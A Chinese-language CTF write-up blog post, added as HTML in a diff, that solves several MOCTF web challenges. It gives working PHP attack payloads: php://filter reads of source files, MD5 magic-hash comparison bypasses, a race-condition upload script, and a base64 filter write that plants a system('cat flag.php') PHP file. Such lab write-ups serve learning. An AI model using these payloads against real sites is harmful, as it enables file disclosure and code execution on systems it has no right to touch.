@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>moctf-wp | Snatsu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MOCTFWEB还是水题 知识点：修改html标签属性 打开题目，要求在输入框内输入moctf，但是无法输入。 所以f12查看器，找到输入框的属性删掉 disabled=&amp;quot;disabled&amp;quot; 并改maxlength=”5”，然后输入moctf得到flag。 我想要钱 知识点：php的科学记数法，time()函数 打开题目，一道代码审计：time()函数返回当前的unix时间戳。">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="moctf-wp">
+<meta property="og:url" content="http://yoursite.com/2019/04/20/moctf-wp/index.html">
+<meta property="og:site_name" content="Snatsu">
+<meta property="og:description" content="MOCTFWEB还是水题 知识点：修改html标签属性 打开题目，要求在输入框内输入moctf，但是无法输入。 所以f12查看器，找到输入框的属性删掉 disabled=&amp;quot;disabled&amp;quot; 并改maxlength=”5”，然后输入moctf得到flag。 我想要钱 知识点：php的科学记数法，time()函数 打开题目，一道代码审计：time()函数返回当前的unix时间戳。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421195757.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200031.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200453.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421201510.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421202100.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191029.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191722.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421193118.png">
+<meta property="og:updated_time" content="2019-04-21T12:40:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="moctf-wp">
+<meta name="twitter:description" content="MOCTFWEB还是水题 知识点：修改html标签属性 打开题目，要求在输入框内输入moctf，但是无法输入。 所以f12查看器，找到输入框的属性删掉 disabled=&amp;quot;disabled&amp;quot; 并改maxlength=”5”，然后输入moctf得到flag。 我想要钱 知识点：php的科学记数法，time()函数 打开题目，一道代码审计：time()函数返回当前的unix时间戳。">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421195757.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Snatsu" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Snatsu</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-moctf-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/20/moctf-wp/" class="article-date">
+  <time datetime="2019-04-20T14:29:37.000Z" itemprop="datePublished">2019-04-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      moctf-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MOCTF"><a href="#MOCTF" class="headerlink" title="MOCTF"></a>MOCTF</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="还是水题"><a href="#还是水题" class="headerlink" title="还是水题"></a>还是水题</h2><blockquote>
+<h3 id="知识点：修改html标签属性"><a href="#知识点：修改html标签属性" class="headerlink" title="知识点：修改html标签属性"></a>知识点：<em>修改html标签属性</em></h3></blockquote>
+<p>打开题目，要求在输入框内输入moctf，但是无法输入。</p>
+<p>所以f12查看器，找到输入框的属性<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421195757.png" alt><br>删掉</p>
+<pre><code>disabled=&quot;disabled&quot;
+</code></pre><p>并改maxlength=”5”，然后输入moctf得到flag。</p>
+<h2 id="我想要钱"><a href="#我想要钱" class="headerlink" title="我想要钱"></a>我想要钱</h2><blockquote>
+<h3 id="知识点：php的科学记数法，time-函数"><a href="#知识点：php的科学记数法，time-函数" class="headerlink" title="知识点：php的科学记数法，time()函数"></a>知识点：<em>php的科学记数法</em>，<em>time()函数</em></h3></blockquote>
+<p>打开题目，一道代码审计：<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200031.png" alt><br>time()函数返回当前的unix时间戳。<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421200453.png" alt><br>money应该少于等于四位且大于当前的unix时间戳。那么它大概有多大呢？<br>将当前时间转换为时间戳：1555848362，是个十位的大数。  要让最多四位的money大于这个数，就要用到科学记数法。</p>
+<p>payload：</p>
+<pre><code>?money=1e10
+</code></pre><p>得到flag。</p>
+<h3 id="关于科学计数法"><a href="#关于科学计数法" class="headerlink" title="关于科学计数法"></a>关于科学计数法</h3><p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421201510.png" alt></p>
+<h4 id="P-S-虽然在excel中1-00E-10是正确写法，但1e10好像也并非是错误的。"><a href="#P-S-虽然在excel中1-00E-10是正确写法，但1e10好像也并非是错误的。" class="headerlink" title="P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。"></a>P.S. 虽然在excel中1.00E+10是正确写法，但1e10好像也并非是错误的。</h4><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><blockquote>
+<h3 id="知识点：文件包含，phpfilter协议流"><a href="#知识点：文件包含，phpfilter协议流" class="headerlink" title="知识点：文件包含，phpfilter协议流"></a>知识点：<em>文件包含</em>，<em>phpfilter协议流</em></h3></blockquote>
+<p>打开题目，url为<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421202100.png" alt>说明可利用文件包含。在源代码注释中发现有</p>
+<pre><code>&lt;!--flag.php--&gt;
+</code></pre><p>直接访问没有发现flag。</p>
+<p>于是使用filter协议，构造payload:</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre><p>得到一串base64：</p>
+<pre><code>SSBoYXZlIGEgZmxhZyEKPD9waHAgCgovL0ZsYWc6IG1vY3Rme2YxbGVfaW5jbHVkNF9lNXN5fQovL0J5OmRhb3l1YW4KCj8+Cg== 
+</code></pre><p>解码得到flag。</p>
+<h4 id="P-S-base64编码前为php代码会被直接执行，而编码后可以读取。"><a href="#P-S-base64编码前为php代码会被直接执行，而编码后可以读取。" class="headerlink" title="P.S. base64编码前为php代码会被直接执行，而编码后可以读取。"></a>P.S. base64编码前为php代码会被直接执行，而编码后可以读取。</h4><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
+<h2 id="php黑魔法"><a href="#php黑魔法" class="headerlink" title="php黑魔法"></a>php黑魔法</h2><blockquote>
+<h3 id="知识点：php-源码泄露"><a href="#知识点：php-源码泄露" class="headerlink" title="知识点：php~源码泄露"></a>知识点：<em>php~源码泄露</em></h3></blockquote>
+<p>hint：好像有源码</p>
+<p>猜测应该是源码泄露。于是尝试各种方法，最终发现index.php~中f12查看到源代码。</p>
+<pre><code>&lt;?php
+$flag=&quot;moctf{**************}&quot;;
+
+if (isset($_GET[&apos;a&apos;])&amp;&amp;isset($_GET[&apos;b&apos;])) {
+    $a=$_GET[&apos;a&apos;];
+    $b=$_GET[&apos;b&apos;];
+
+
+    if($a==$b) 
+    {
+        echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;;
+    }
+    else {
+        if(md5($a)==md5($b)) 
+        {
+            echo &quot;&lt;center&gt;&quot;.$flag.&quot;&lt;/center&gt;&quot;; 
+            echo &quot;By:daoyuan&quot;;
+        }
+        else echo &quot;&lt;center&gt;Wrong Answer!&lt;/center&gt;&quot;;
+    }
+
+}
+else echo &quot;&lt;center&gt;濂藉儚灏戜簡鐐逛粈涔�&lt;/center&gt;&quot;; 
+?&gt;
+</code></pre><p>要求a与b的值不同而md5的值相同，构造payload：</p>
+<blockquote>
+<p><a href="http://119.23.73.3:5001/web5/index.php?a=QNKCDZO&amp;b=240610708" target="_blank" rel="noopener">http://119.23.73.3:5001/web5/index.php?a=QNKCDZO&amp;b=240610708</a></p>
+</blockquote>
+<p>得到flag。</p>
+<h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</a></p>
+<h2 id="没时间解释了"><a href="#没时间解释了" class="headerlink" title="没时间解释了"></a>没时间解释了</h2><blockquote>
+<h3 id="知识点：302跳转，条件竞争"><a href="#知识点：302跳转，条件竞争" class="headerlink" title="知识点：302跳转，条件竞争"></a>知识点：<em>302跳转</em>，<em>条件竞争</em></h3></blockquote>
+<p>打开题目链接，跳转到index2.php。考虑到一般都是直接index.php，所以尝试一下，发现还是会跳转到index2。猜测可能是302跳转。<br><br>burp抓包。action-&gt;Send to Repeater将index2改为index，Go。<br><br>访问uploadsomething.php<br>试着随便传了下文件，得知要得到flag就要访问给出的文件路径。<br>访问路径，却显示“Too Slow！”<br><br>这里卡了好久，后来想到应该是上传后立刻服务器将文件删除。此处就可以利用条件竞争漏洞。<br></p>
+<ul>
+<li>使用burp不停上传文件</li>
+<li>使用脚本不停访问文件<br>上传如图内容<img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191029.png" alt>取得路径：<a href="http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233" target="_blank" rel="noopener">http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233</a><br><h3 id="burp"><a href="#burp" class="headerlink" title="burp"></a>burp</h3>burp抓包 action-&gt;send to intruder</li>
+<li>clear $</li>
+<li>payload type:null payloads</li>
+<li>payload options -&gt; continue indefinitely</li>
+<li>number of threads:20<h3 id="py脚本"><a href="#py脚本" class="headerlink" title="py脚本"></a>py脚本</h3>脚本如下：<br></li>
+</ul>
+<pre><code>import requests
+u = &quot;http://119.23.73.3:5006/web2/uploads/5a3e88b9cef15e18d7d6f538b48769237bb12f2e/233&quot;
+t = requests.get(u).text
+while True:
+    print(t)
+</code></pre><p>得到flag。<br>moctf{y0u_n4ed_f4st}  </p>
+<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><p>条件竞争漏洞<br><br><a href="https://www.0dayhack.com/post-666.html" target="_blank" rel="noopener">https://www.0dayhack.com/post-666.html</a><br><a href="https://blog.csdn.net/qq_36992198/article/details/80007405" target="_blank" rel="noopener">https://blog.csdn.net/qq_36992198/article/details/80007405</a></p>
+<h2 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h2><blockquote>
+<h3 id="知识点：base64绕过php-exit"><a href="#知识点：base64绕过php-exit" class="headerlink" title="知识点：base64绕过php exit"></a>知识点：<em>base64绕过php exit</em></h3></blockquote>
+<p>打开题目，发现直接给出一段代码。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421191722.png" alt><br><br>可以看到$c初始值为”&lt;?php exit; ?&gt;”，然后.=我们post进去的c值。</p>
+<p>即：</p>
+<pre><code>&lt;?php
+    exit;
+?&gt;
+xxxxx
+</code></pre><p>其中xxxxx是我们传进去的数据。</p>
+<p>所以无论我们传入什么数据，$c的头部都会是一段exit，直接退出脚本。那么，现在的问题就是如何绕过这段exit了。</p>
+<p>经百度得知，可以使用phpfilter协议流进行绕过。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190421193118.png" alt><br>于是构造payload</p>
+<pre><code>c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php
+</code></pre><p>利用hackbar，post，成功绕过。</p>
+<h3 id="附-1"><a href="#附-1" class="headerlink" title="附"></a>附</h3><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/20/moctf-wp/" data-id="cjuqyp6m60000b0v7krup22g6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/04/20/读书笔记-记录/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          读书笔记/记录
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">四月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/20/读书笔记-记录/">读书笔记/记录</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/moctf-wp/">moctf-wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 snatsu<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
